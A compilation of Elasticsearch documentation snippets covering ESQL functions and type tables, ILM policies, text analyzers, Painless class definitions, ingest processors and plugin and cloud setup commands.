TITLE: Calculating Angle with ATAN2 Function in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates how to use the ATAN2 function in an Elasticsearch SQL query. It calculates the angle between the positive x-axis and the ray from the origin to the point (x, y) in radians. The example uses y=12.9 and x=0.6 as input values.

LANGUAGE: sql
CODE:
ROW y=12.9, x=.6
| EVAL atan2=ATAN2(y, x)

----------------------------------------

TITLE: Markdown Type Definition Table
DESCRIPTION: Table defining supported return type for an ESQL function, indicating it returns double values.

LANGUAGE: markdown
CODE:
| result |
| --- |
| double |

----------------------------------------

TITLE: Running Google Drive Connector Docker Container
DESCRIPTION: Docker command to run the Google Drive connector service with the specified configuration.

LANGUAGE: sh
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Adding Custom Elasticsearch Port to Running GCE Instance
DESCRIPTION: This snippet demonstrates how to add metadata specifying a custom Elasticsearch port to an already running Google Compute Engine instance.

LANGUAGE: sh
CODE:
gcloud compute instances add-metadata myesnode1 \
       --zone europe-west1-a \
       --metadata es_port=9301

----------------------------------------

TITLE: Defining DoubleBuffer Class in Java NIO
DESCRIPTION: Defines the DoubleBuffer class with a method to get a double at a specific index. Some methods are commented out as TODOs.

LANGUAGE: Java
CODE:
class java.nio.DoubleBuffer {
  double get(int)
  # TODO: https:#github.com/elastic/elasticsearch/issues/79867
  # DoubleBuffer get(int, double[])
  # DoubleBuffer get(int, double[], int, int)
}

----------------------------------------

TITLE: Lowercase Conversion Method in Painless for Elasticsearch
DESCRIPTION: This method uses the lowercase processor to convert a string to its lowercase equivalent. It takes a string parameter and returns the lowercase string.

LANGUAGE: painless
CODE:
String lowercase(String value);

----------------------------------------

TITLE: Defining ESQL Function Test Case Parameters
DESCRIPTION: This snippet contains a comment indicating that the file is generated automatically by ESQL's AbstractFunctionTestCase. It also specifies that the file should not be edited manually and refers to a README.md file for instructions on how to regenerate it.

LANGUAGE: plaintext
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Document Creation and Filtered Search
DESCRIPTION: Example of creating documents and performing a filtered search combining _source parameter with filter_path to return specific fields.

LANGUAGE: console
CODE:
POST /library/_doc?refresh
{"title": "Book #1", "rating": 200.1}
POST /library/_doc?refresh
{"title": "Book #2", "rating": 1.7}
POST /library/_doc?refresh
{"title": "Book #3", "rating": 0.1}
GET /_search?filter_path=hits.hits._source&_source=title&sort=rating:desc

----------------------------------------

TITLE: Simulating Fingerprint Processor in Elasticsearch
DESCRIPTION: This example demonstrates how to use the fingerprint processor in an Elasticsearch ingest pipeline. It computes a hash of the 'user' field in the document.

LANGUAGE: console
CODE:
POST _ingest/pipeline/_simulate
{
  "pipeline": {
    "processors": [
      {
        "fingerprint": {
          "fields": ["user"]
        }
      }
    ]
  },
  "docs": [
    {
      "_source": {
        "user": {
          "last_name": "Smith",
          "first_name": "John",
          "date_of_birth": "1980-01-15",
          "is_active": true
        }
      }
    }
  ]
}

----------------------------------------

TITLE: Combining Keyword Repeat and Stemmer Filters in Elasticsearch
DESCRIPTION: This example demonstrates how to use the keyword_repeat filter in combination with the stemmer filter to produce both stemmed and unstemmed versions of tokens.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "whitespace",
  "filter": [
    "keyword_repeat",
    "stemmer"
  ],
  "text": "fox running and jumping",
  "explain": true,
  "attributes": "keyword"
}

----------------------------------------

TITLE: Defining Null Role Descriptor in Elasticsearch
DESCRIPTION: This snippet defines a null role descriptor with empty permissions for cluster, indices, applications, and run-as capabilities.

LANGUAGE: json
CODE:
{"cluster":[],"indices":[],"applications":[],"run_as":[]}

----------------------------------------

TITLE: Static Imports for Dissect Methods in Elasticsearch Painless Scripts
DESCRIPTION: Defines static imports for two dissect methods from the NamedGroupExtractor class. These imports are marked with @compile_time_only, suggesting they are resolved at compile time rather than runtime.

LANGUAGE: Painless
CODE:
static_import {
    org.elasticsearch.runtimefields.NamedGroupExtractor dissect(String) from_class org.elasticsearch.runtimefields.NamedGroupExtractor @compile_time_only
    org.elasticsearch.runtimefields.NamedGroupExtractor dissect(String, String) from_class org.elasticsearch.runtimefields.NamedGroupExtractor @compile_time_only
}

----------------------------------------

TITLE: Setting Up TDVT Workspace
DESCRIPTION: Command to set up a TDVT workspace, creating necessary directories and config files for testing.

LANGUAGE: bash
CODE:
$TDVT action --setup

----------------------------------------

TITLE: Configuring Index Priority in Elasticsearch ILM Policy
DESCRIPTION: Creates an ILM policy that sets the index priority to 50 during the warm phase. This affects the order in which indices are recovered after a node restart, with higher priority indices being recovered first. The priority value must be 0 or greater.

LANGUAGE: console
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "warm": {
        "actions": {
          "set_priority" : {
            "priority": 50
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Using RTRIM in ESQL for Trailing Whitespace Removal
DESCRIPTION: Example shows how to use RTRIM function to remove trailing whitespaces from string values in a ROW operation. The example demonstrates the function usage on two fields and includes string concatenation to visualize the results with single quotes.

LANGUAGE: sql
CODE:
ROW message = "   some text  ",  color = " red "
| EVAL message = RTRIM(message)
| EVAL color = RTRIM(color)
| EVAL message = CONCAT("'", message, "'")
| EVAL color = CONCAT("'", color, "'")

----------------------------------------

TITLE: Calculating Hypotenuse with HYPOT Function in ESQL
DESCRIPTION: This snippet demonstrates the usage of the HYPOT function in ESQL to calculate the hypotenuse of a right triangle. It takes two numeric inputs representing the lengths of the other two sides and returns the length of the hypotenuse as a double value.

LANGUAGE: sql
CODE:
ROW a = 3.0, b = 4.0
| EVAL c = HYPOT(a, b)

----------------------------------------

TITLE: Displaying Supported Types Table in Markdown
DESCRIPTION: A markdown table showing the supported input types (geomA and geomB) and the resulting output type for an ESQL function. It covers various combinations of cartesian and geographic point and shape types.

LANGUAGE: markdown
CODE:
| geomA | geomB | result |
| --- | --- | --- |
| cartesian_point | cartesian_point | boolean |
| cartesian_point | cartesian_shape | boolean |
| cartesian_shape | cartesian_point | boolean |
| cartesian_shape | cartesian_shape | boolean |
| geo_point | geo_point | boolean |
| geo_point | geo_shape | boolean |
| geo_shape | geo_point | boolean |
| geo_shape | geo_shape | boolean |

----------------------------------------

TITLE: Date Interval Type Support Matrix in Markdown
DESCRIPTION: A tabular representation showing the supported combinations of interval types and date types, along with their result types in ESQL operations.

LANGUAGE: markdown
CODE:
| interval | date | result |
| --- | --- | --- |
| date_period | date | date |
| date_period | date_nanos | date_nanos |
| time_duration | date | date |
| time_duration | date_nanos | date_nanos |

----------------------------------------

TITLE: Basic EQL Query Translation
DESCRIPTION: Tests basic EQL query translation functionality with a simple 'process where true' query.

LANGUAGE: eql
CODE:
process where true

LANGUAGE: json
CODE:
;

----------------------------------------

TITLE: Installing GCE Discovery Plugin
DESCRIPTION: Command to install the Elasticsearch GCE discovery plugin using the plugin manager.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install discovery-gce

----------------------------------------

TITLE: BigDecimal Class Definition in Painless
DESCRIPTION: Defines the BigDecimal class structure with its constants, constructors, and mathematical operation methods. Includes precision-based calculations and various numeric conversions.

LANGUAGE: java
CODE:
class java.math.BigDecimal {
  BigDecimal ONE
  BigDecimal TEN
  BigDecimal ZERO
  (String)
  (String,MathContext)
  BigDecimal abs()
  BigDecimal abs(MathContext)
  BigDecimal add(BigDecimal)
  BigDecimal add(BigDecimal,MathContext)
  byte byteValueExact()
  int compareTo(BigDecimal)
  BigDecimal divide(BigDecimal)
  BigDecimal divide(BigDecimal,MathContext)
  BigDecimal[] divideAndRemainder(BigDecimal)
  BigDecimal[] divideAndRemainder(BigDecimal,MathContext)
  BigDecimal divideToIntegralValue(BigDecimal)
  BigDecimal divideToIntegralValue(BigDecimal,MathContext)
  int intValueExact()
  long longValueExact()
  BigDecimal max(BigDecimal)
  BigDecimal min(BigDecimal)
  BigDecimal movePointLeft(int)
  BigDecimal movePointRight(int)
  BigDecimal multiply(BigDecimal)
  BigDecimal multiply(BigDecimal,MathContext)
  BigDecimal negate()
  BigDecimal negate(MathContext)
  BigDecimal plus()
  BigDecimal plus(MathContext)
  BigDecimal pow(int)
  BigDecimal pow(int,MathContext)
  int precision()
  BigDecimal remainder(BigDecimal)
  BigDecimal remainder(BigDecimal,MathContext)
  BigDecimal round(MathContext)
  int scale()
  BigDecimal scaleByPowerOfTen(int)
  BigDecimal setScale(int)
  BigDecimal setScale(int,RoundingMode)
  short shortValueExact()
  int signum()
  BigDecimal stripTrailingZeros()
  BigDecimal subtract(BigDecimal)
  BigDecimal subtract(BigDecimal,MathContext)
  BigInteger toBigInteger()
  BigInteger toBigIntegerExact()
  String toEngineeringString()
  String toPlainString()
  BigDecimal ulp()
  BigDecimal valueOf(double)
}

----------------------------------------

TITLE: Indexing Answer Documents in Elasticsearch
DESCRIPTION: These snippets demonstrate how to index answer documents that are linked to a parent question document using the join field.

LANGUAGE: console
CODE:
PUT parent_example/_doc/2?routing=1
{
  "join": {
    "name": "answer",
    "parent": "1"
  },
  "owner": {
    "location": "Norfolk, United Kingdom",
    "display_name": "Sam",
    "id": 48
  },
  "body": "<p>Unfortunately you're pretty much limited to FTP...",
  "creation_date": "2009-05-04T13:45:37.030"
}

PUT parent_example/_doc/3?routing=1&refresh
{
  "join": {
    "name": "answer",
    "parent": "1"
  },
  "owner": {
    "location": "Norfolk, United Kingdom",
    "display_name": "Troll",
    "id": 49
  },
  "body": "<p>Use Linux...",
  "creation_date": "2009-05-05T13:45:37.030"
}

----------------------------------------

TITLE: Restricting Thread Creation in Java
DESCRIPTION: This snippet lists Java methods for creating thread pools that should be avoided due to their use of vague thread names. It recommends using a custom thread factory to name threads appropriately.

LANGUAGE: java
CODE:
java.util.concurrent.Executors#newFixedThreadPool(int)
java.util.concurrent.Executors#newSingleThreadExecutor()
java.util.concurrent.Executors#newCachedThreadPool()
java.util.concurrent.Executors#newSingleThreadScheduledExecutor()
java.util.concurrent.Executors#newScheduledThreadPool(int)
java.util.concurrent.Executors#defaultThreadFactory()
java.util.concurrent.Executors#privilegedThreadFactory()

----------------------------------------

TITLE: Documenting Number Parameter for Space Generation
DESCRIPTION: Documentation for a number parameter that specifies the quantity of spaces to be generated in the result. This appears to be part of an automatically generated test case documentation.

LANGUAGE: markdown
CODE:
number\n:   Number of spaces in result.

----------------------------------------

TITLE: Analyzing Text with Keyword Attribute Explanation in Elasticsearch
DESCRIPTION: This example demonstrates how to view the keyword attribute for tokens when using the keyword_marker and stemmer filters.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "whitespace",
  "filter": [
    {
      "type": "keyword_marker",
      "keywords": [ "jumping" ]
    },
    "stemmer"
  ],
  "text": "fox running and jumping",
  "explain": true,
  "attributes": "keyword"
}

----------------------------------------

TITLE: LDAP Bind Operations - Java API References
DESCRIPTION: Lists critical LDAP bind operations that should be avoided within LDAP Response handlers due to potential deadlock risks. These operations should be replaced with LdapUtils methods for safe implementation.

LANGUAGE: java
CODE:
com.unboundid.ldap.sdk.LDAPConnection#bind(com.unboundid.ldap.sdk.BindRequest)
com.unboundid.ldap.sdk.LDAPConnection#bind(java.lang.String, java.lang.String)
com.unboundid.ldap.sdk.LDAPConnectionPool#bindAndRevertAuthentication(com.unboundid.ldap.sdk.BindRequest)
com.unboundid.ldap.sdk.LDAPConnectionPool#bindAndRevertAuthentication(java.lang.String, java.lang.String, com.unboundid.ldap.sdk.Control[])

----------------------------------------

TITLE: GeoShape Class Definition
DESCRIPTION: Empty class definition for handling geometric shapes in SQL expressions

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.sql.expression.literal.geo.GeoShape {
}

----------------------------------------

TITLE: Assigning Index Based on Multiple Node Attributes
DESCRIPTION: Demonstrates an ILM policy that assigns indices to nodes based on multiple attributes (box_type and storage) during the cold phase.

LANGUAGE: json
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "cold": {
        "actions": {
          "allocate" : {
            "require" : {
              "box_type": "cold",
              "storage": "high"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Hyperbolic Tangent using TANH in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates how to use the TANH function in ESQL to calculate the hyperbolic tangent of a number. It first creates a row with a single column 'a' containing the value 1.8, then uses the EVAL command to apply the TANH function to this value and store the result in a new column named 'tanh'.

LANGUAGE: sql
CODE:
ROW a=1.8
| EVAL tanh=TANH(a)

----------------------------------------

TITLE: Converting Degrees to Radians using TO_RADIANS in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates the usage of the TO_RADIANS function in ESQL. It converts a list of degree values to their corresponding radian values. The function takes a numeric input in degrees and returns the equivalent value in radians.

LANGUAGE: sql
CODE:
ROW deg = [90.0, 180.0, 270.0]
| EVAL rad = TO_RADIANS(deg)

----------------------------------------

TITLE: Time Unit Function Type Support Matrix
DESCRIPTION: Markdown table showing supported data type combinations for time unit operations. Maps unit types (keyword/text) against timestamp types (date/date_nanos) with integer results.

LANGUAGE: markdown
CODE:
| unit | startTimestamp | endTimestamp | result |
| --- | --- | --- | --- |
| keyword | date | date | integer |
| keyword | date | date_nanos | integer |
| keyword | date_nanos | date | integer |
| keyword | date_nanos | date_nanos | integer |
| text | date | date | integer |
| text | date | date_nanos | integer |
| text | date_nanos | date | integer |
| text | date_nanos | date_nanos | integer |

----------------------------------------

TITLE: Searchable Snapshot with Temporary Replicas Configuration
DESCRIPTION: Shows how to configure an ILM policy that creates a searchable snapshot with replicas maintained for 14 days before deletion. Includes rollover conditions and explicit deletion phase.

LANGUAGE: console
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "hot": {
        "actions": {
          "rollover" : {
            "max_primary_shard_size": "50gb"
          },
          "searchable_snapshot" : {
            "snapshot_repository" : "backing_repo",
            "replicate_for": "14d"
          }
        }
      },
      "delete": {
        "min_age": "28d",
        "actions": {
          "delete" : { }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Enabling Automatic Node Attributes for EC2 in Elasticsearch YAML
DESCRIPTION: Configuration to automatically set the aws_availability_zone attribute and use it for allocation awareness.

LANGUAGE: yaml
CODE:
cloud.node.auto_attributes: true
cluster.routing.allocation.awareness.attributes: aws_availability_zone

----------------------------------------

TITLE: Defining the CharSequence Interface in Painless
DESCRIPTION: Specifies the methods available for CharSequence objects in Painless, including charAt, length, and subSequence.

LANGUAGE: java
CODE:
class java.lang.CharSequence {
  char charAt(int)
  IntStream chars()
  IntStream codePoints()
  int length()
  String org.elasticsearch.painless.api.Augmentation replaceAll(Pattern,Function)
  String org.elasticsearch.painless.api.Augmentation replaceFirst(Pattern,Function)
  CharSequence subSequence(int,int)
  String toString()
}

----------------------------------------

TITLE: Configuring Distance Units in Geo-distance Aggregation
DESCRIPTION: This snippet shows how to specify custom distance units (kilometers in this case) for the geo-distance aggregation. It demonstrates the use of the 'unit' parameter in the aggregation definition.

LANGUAGE: console
CODE:
POST /museums/_search?size=0
{
  "aggs": {
    "rings": {
      "geo_distance": {
        "field": "location",
        "origin": "POINT (4.894 52.3760)",
        "unit": "km",
        "ranges": [
          { "to": 100 },
          { "from": 100, "to": 300 },
          { "from": 300 }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: ESQL String Split Function Parameters Documentation
DESCRIPTION: Documents the parameters for an ESQL string splitting function. Accepts a string input and a single-byte delimiter, with special handling for null values.

LANGUAGE: markdown
CODE:
**Parameters**

`string`
:   String expression. If `null`, the function returns `null`.

`delim`
:   Delimiter. Only single byte delimiters are currently supported.

----------------------------------------

TITLE: Listing Installed Elasticsearch Plugins
DESCRIPTION: Command to display all currently installed plugins in Elasticsearch using the elasticsearch-plugin utility.

LANGUAGE: shell
CODE:
sudo bin/elasticsearch-plugin list

----------------------------------------

TITLE: Rollover Based on Total Index Size
DESCRIPTION: ILM policy configuration that triggers rollover when the total index size reaches 100GB.

LANGUAGE: json
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "hot": {
        "actions": {
          "rollover" : {
            "max_size": "100gb"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with Dictionary Decompounder Filter
DESCRIPTION: Example of using the dictionary_decompounder filter to analyze the compound word 'Donaudampfschiff' using specific word list entries.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer": "standard",
  "filter": [
    {
      "type": "dictionary_decompounder",
      "word_list": ["Donau", "dampf", "meer", "schiff"]
    }
  ],
  "text": "Donaudampfschiff"
}

----------------------------------------

TITLE: Checking Azure VM Network Endpoints
DESCRIPTION: Command to verify the VM's network endpoints and IP address after deployment, useful when DNS propagation is pending.

LANGUAGE: sh
CODE:
# Look at Network `Endpoints 0 Vip`
azure vm show myesnode1

----------------------------------------

TITLE: Displaying Supported Field Types and Results in Markdown
DESCRIPTION: A markdown table showing the mapping between field types and their corresponding result types in ESQL's AbstractFunctionTestCase. This table includes various data types such as boolean, date, numeric types, geometric types, and specialized types like IP and version.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | boolean |
| cartesian_point | cartesian_point |
| cartesian_shape | cartesian_shape |
| date | date |
| date_nanos | date_nanos |
| double | double |
| geo_point | geo_point |
| geo_shape | geo_shape |
| integer | integer |
| ip | ip |
| keyword | keyword |
| long | long |
| text | keyword |
| unsigned_long | unsigned_long |
| version | version |

----------------------------------------

TITLE: Setting Basic Field Value in Elasticsearch
DESCRIPTION: Simple example of using the Set processor to set a count field to value 1

LANGUAGE: json
CODE:
{
  "description" : "sets the value of count to 1",
  "set": {
    "field": "count",
    "value": 1
  }
}

----------------------------------------

TITLE: Querying Geometry Boundaries with ST_YMIN in Elasticsearch SQL
DESCRIPTION: Example demonstrating how to extract minimum and maximum coordinate boundaries from a geometry object using ST_YMIN along with related functions ST_XMIN, ST_XMAX, and ST_YMAX. The query filters airport boundaries for 'CPH' and creates an envelope of the city boundary.

LANGUAGE: sql
CODE:
FROM airport_city_boundaries
| WHERE abbrev == "CPH"
| EVAL envelope = ST_ENVELOPE(city_boundary)
| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)
| KEEP abbrev, airport, xmin, xmax, ymin, ymax

----------------------------------------

TITLE: Calculating Median of Multivalued Field using MV_MEDIAN in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to use the MV_MEDIAN function in Elasticsearch's ESQL to calculate the median value of a multivalued field. It creates a new single-valued field containing the median.

LANGUAGE: sql
CODE:
ROW a=[3, 5, 1]
| EVAL median_a = MV_MEDIAN(a)

----------------------------------------

TITLE: Defining Supported Geometry Types and Result Types in Markdown
DESCRIPTION: This markdown table outlines the supported geometry types for ESQL functions, including cartesian_point, cartesian_shape, geo_point, and geo_shape. It specifies that all these types return a double as the result type.

LANGUAGE: markdown
CODE:
| point | result |
| --- | --- |
| cartesian_point | double |
| cartesian_shape | double |
| geo_point | double |
| geo_shape | double |

----------------------------------------

TITLE: Multiple Values Weighted Average in Elasticsearch
DESCRIPTION: Shows how to handle multiple values in a single document with a single weight. The example demonstrates how multiple grade values are weighted equally with a single weight value.

LANGUAGE: console
CODE:
POST /exams/_doc?refresh
{
  "grade": [1, 2, 3],
  "weight": 2
}

POST /exams/_search
{
  "size": 0,
  "aggs": {
    "weighted_grade": {
      "weighted_avg": {
        "value": {
          "field": "grade"
        },
        "weight": {
          "field": "weight"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Extracting Right Characters with ESQL RIGHT Function
DESCRIPTION: Query that extracts the last 3 characters from employee last names using the RIGHT function. The results are sorted alphabetically and limited to 5 rows. Demonstrates string manipulation, sorting, and result limiting in ESQL.

LANGUAGE: esql
CODE:
FROM employees
| KEEP last_name
| EVAL right = RIGHT(last_name, 3)
| SORT last_name ASC
| LIMIT 5

----------------------------------------

TITLE: Creating Azure Keystore for Elasticsearch Plugin
DESCRIPTION: Commands to create a PKCS12 keystore for the Elasticsearch Azure plugin using the generated keys and certificates.

LANGUAGE: sh
CODE:
openssl pkcs8 -topk8 -nocrypt -in azure-private.key -inform PEM -out azure-pk.pem -outform PEM
openssl x509 -inform der -in azure-certificate.cer -out azure-cert.pem
cat azure-cert.pem azure-pk.pem > azure.pem.txt
openssl pkcs12 -export -in azure.pem.txt -out azurekeystore.pkcs12 -name azure -noiter -nomaciter

----------------------------------------

TITLE: Defining the String Class in Painless
DESCRIPTION: Specifies the methods and constructors available for String objects in Painless scripts, including comparison, manipulation, and formatting operations.

LANGUAGE: java
CODE:
class java.lang.String {
  ()
  int codePointAt(int)
  int codePointBefore(int)
  int codePointCount(int,int)
  int compareTo(String)
  int compareToIgnoreCase(String)
  String concat(String)
  boolean contains(CharSequence)
  boolean contentEquals(CharSequence)
  String copyValueOf(char[])
  String copyValueOf(char[],int,int)
  String org.elasticsearch.painless.api.Augmentation decodeBase64()
  String org.elasticsearch.painless.api.Augmentation encodeBase64()
  String[] org.elasticsearch.painless.api.Augmentation splitOnToken(String)
  String[] org.elasticsearch.painless.api.Augmentation splitOnToken(String, int)
  boolean endsWith(String)
  boolean equalsIgnoreCase(String)
  String format(Locale,String,def[])
  String format(String,def[])
  void getChars(int,int,char[],int)
  int indexOf(String)
  int indexOf(String,int)
  boolean isEmpty()
  String join(CharSequence,Iterable)
  int lastIndexOf(String)
  int lastIndexOf(String,int)
  int offsetByCodePoints(int,int)
  boolean regionMatches(boolean,int,String,int,int)
  boolean regionMatches(int,String,int,int)
  String replace(CharSequence,CharSequence)
  boolean startsWith(String)
  boolean startsWith(String,int)
  String substring(int)
  String substring(int,int)
  char[] toCharArray()
  String toLowerCase()
  String toLowerCase(Locale)
  String toUpperCase()
  String toUpperCase(Locale)
  String trim()
  String valueOf(def)
}

----------------------------------------

TITLE: Runtime Field Percentiles Calculation
DESCRIPTION: Demonstrates using runtime fields to calculate percentiles on transformed data, converting milliseconds to seconds in this example.

LANGUAGE: console
CODE:
GET latency/_search
{
  "size": 0,
  "runtime_mappings": {
    "load_time.seconds": {
      "type": "long",
      "script": {
        "source": "emit(doc['load_time'].value / params.timeUnit)",
        "params": {
          "timeUnit": 1000
        }
      }
    }
  },
  "aggs": {
    "load_time_outlier": {
      "percentiles": {
        "field": "load_time.seconds"
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with Keep Types Filter (Include Mode) in Elasticsearch
DESCRIPTION: This example uses the Analyze API to demonstrate the Keep Types filter keeping only numeric tokens from the input text.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer": "standard",
  "filter": [
    {
      "type": "keep_types",
      "types": [ "<NUM>" ]
    }
  ],
  "text": "1 quick fox 2 lazy dogs"
}

----------------------------------------

TITLE: ESQL SUBSTRING with Negative Position
DESCRIPTION: Shows how to extract the last three characters from employee last names using SUBSTRING function with a negative start position to count from the end of the string.

LANGUAGE: esql
CODE:
FROM employees
| KEEP last_name
| EVAL ln_sub = SUBSTRING(last_name, -3, 3)

----------------------------------------

TITLE: Creating Custom Analyzer with Decimal Digit Filter in Elasticsearch
DESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that incorporates the decimal_digit filter. The analyzer uses a whitespace tokenizer followed by the decimal_digit filter.

LANGUAGE: console
CODE:
PUT /decimal_digit_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "whitespace_decimal_digit": {
          "tokenizer": "whitespace",
          "filter": [ "decimal_digit" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Setting GCE Project Configuration
DESCRIPTION: Command to set the default Google Cloud project for subsequent operations.

LANGUAGE: sh
CODE:
gcloud config set project es-cloud

----------------------------------------

TITLE: Defining Supported Types for IP Address Function in Elasticsearch ESQL
DESCRIPTION: This snippet outlines the supported types for an IP address function in Elasticsearch ESQL. It specifies the input parameters (ip, prefixLengthV4, prefixLengthV6) and the result type.

LANGUAGE: markdown
CODE:
| ip | prefixLengthV4 | prefixLengthV6 | result |
| --- | --- | --- | --- |
| ip | integer | integer | ip |

----------------------------------------

TITLE: Configuring Rename Processor in Elasticsearch
DESCRIPTION: This code snippet demonstrates how to configure the Rename processor in Elasticsearch. It shows renaming the 'provider' field to 'cloud.provider'.

LANGUAGE: javascript
CODE:
{
  "rename": {
    "field": "provider",
    "target_field": "cloud.provider"
  }
}

----------------------------------------

TITLE: Calculating Arcsine Using ASIN Function in ESQL
DESCRIPTION: This snippet demonstrates how to use the ASIN function in Elasticsearch SQL to calculate the arcsine of a numeric value. It creates a row with a value of 0.9 and then applies the ASIN function to compute its arcsine in radians.

LANGUAGE: sql
CODE:
ROW a=.9
| EVAL asin=ASIN(a)

----------------------------------------

TITLE: Using ABS Function in ESQL
DESCRIPTION: Demonstrates how to use the ABS function to calculate the absolute value of a number in ESQL. The example converts -1.0 to its absolute value.

LANGUAGE: sql
CODE:
ROW number = -1.0
| EVAL abs_number = ABS(number)

----------------------------------------

TITLE: Value Count Aggregation with Histogram Fields
DESCRIPTION: Illustrates how to use value count aggregation with histogram fields, where the aggregation sums all numbers in the counts array of the histogram data.

LANGUAGE: console
CODE:
PUT metrics_index/_doc/1
{
  "network.name" : "net-1",
  "latency_histo" : {
      "values" : [0.1, 0.2, 0.3, 0.4, 0.5],
      "counts" : [3, 7, 23, 12, 6]
   }
}

PUT metrics_index/_doc/2
{
  "network.name" : "net-2",
  "latency_histo" : {
      "values" :  [0.1, 0.2, 0.3, 0.4, 0.5],
      "counts" : [8, 17, 8, 7, 6]
   }
}

POST /metrics_index/_search?size=0
{
  "aggs": {
    "total_requests": {
      "value_count": { "field": "latency_histo" }
    }
  }
}

----------------------------------------

TITLE: Function Documentation with Java Annotations
DESCRIPTION: Example of using @FunctionInfo annotation to document ESQL functions with examples that will be automatically included in documentation.

LANGUAGE: java
CODE:
@FunctionInfo(
    returnType = "double",
    description = "Returns ths {wikipedia}/Sine_and_cosine[Sine] trigonometric function of an angle.",
    examples = @Example(file = "floats", tag = "sin")
)

----------------------------------------

TITLE: Installing Ukrainian Analysis Plugin in Elasticsearch
DESCRIPTION: Command to install the Ukrainian analysis plugin using the Elasticsearch plugin manager. The plugin must be installed on every node in the cluster, and each node must be restarted after installation.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install analysis-ukrainian

----------------------------------------

TITLE: Defining Utility Classes for Elasticsearch Scripting
DESCRIPTION: Defines utility classes like BytesRef, FieldLookup, and various classes related to similarity scoring and interval filtering in Elasticsearch scripts.

LANGUAGE: painless
CODE:
class org.apache.lucene.util.BytesRef {
  byte[] bytes
  int offset
  int length
  boolean bytesEquals(BytesRef)
  String utf8ToString()
}

class org.elasticsearch.search.lookup.FieldLookup {
  def getValue()
  List getValues()
  boolean isEmpty()
}

class org.elasticsearch.index.similarity.ScriptedSimilarity$Query {
  float getBoost()
}

class org.elasticsearch.index.similarity.ScriptedSimilarity$Field {
  long getDocCount()
  long getSumDocFreq()
  long getSumTotalTermFreq()
}

class org.elasticsearch.index.similarity.ScriptedSimilarity$Term {
  long getDocFreq()
  long getTotalTermFreq()
}

class org.elasticsearch.index.similarity.ScriptedSimilarity$Doc {
  int getLength()
  float getFreq()
}

class org.elasticsearch.index.query.IntervalFilterScript$Interval {
  int getStart()
  int getEnd()
  int getGaps()
}

class org.elasticsearch.script.ScoreScript$ExplanationHolder {
  void set(String)
}

----------------------------------------

TITLE: Top Hits with Pipeline Aggregation in Elasticsearch
DESCRIPTION: This example shows how to use top_hits within a pipeline aggregation (bucket_selector) to apply per-bucket filtering, similar to a SQL HAVING clause.

LANGUAGE: json
CODE:
{
  "aggs": {
    "top_tags": {
      "terms": {
        "field": "type",
        "size": 3
      },
      "aggs": {
        "top_sales_hits": {
          "top_hits": {
            "sort": [
              {
                "date": {
                  "order": "desc"
                }
              }
            ],
            "_source": {
              "includes": [ "date", "price" ]
            },
            "size": 1
          }
        },
        "having.top_salary": {
          "bucket_selector": {
            "buckets_path": {
              "tp": "top_sales_hits[_source.price]"
            },
            "script": "params.tp < 180"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Required Zoom API Scopes
DESCRIPTION: List of required Zoom API scopes for connector functionality

LANGUAGE: bash
CODE:
user:read:list_users:admin
meeting:read:list_meetings:admin
meeting:read:list_past_participants:admin
cloud_recording:read:list_user_recordings:admin
team_chat:read:list_user_channels:admin
team_chat:read:list_user_messages:admin

----------------------------------------

TITLE: Creating Custom Analyzer with Word Delimiter Filter in Elasticsearch
DESCRIPTION: This example shows how to create a custom analyzer using the word_delimiter filter in the create index API.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "keyword",
          "filter": [ "word_delimiter" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: ESQL STD_DEV Function Documentation Structure
DESCRIPTION: Markdown structure defining the documentation layout for the STD_DEV function, including sections for syntax visualization, parameters, description, types and examples.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `STD_DEV` [esql-std_dev]

**Syntax**

:::{image} ../../../images/functions/std_dev.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/std_dev.md
:::

:::{include} ../description/std_dev.md
:::

:::{include} ../types/std_dev.md
:::

:::{include} ../examples/std_dev.md
:::

----------------------------------------

TITLE: Demonstrating Expand Parameter Effects on Synonym Mappings
DESCRIPTION: Illustrates how the expand parameter in the synonym token filter configuration affects the interpretation of synonym mappings.

LANGUAGE: plaintext
CODE:
# If expand==true in the synonym token filter configuration,
# "ipod, i-pod, i pod" is equivalent to the explicit mapping:
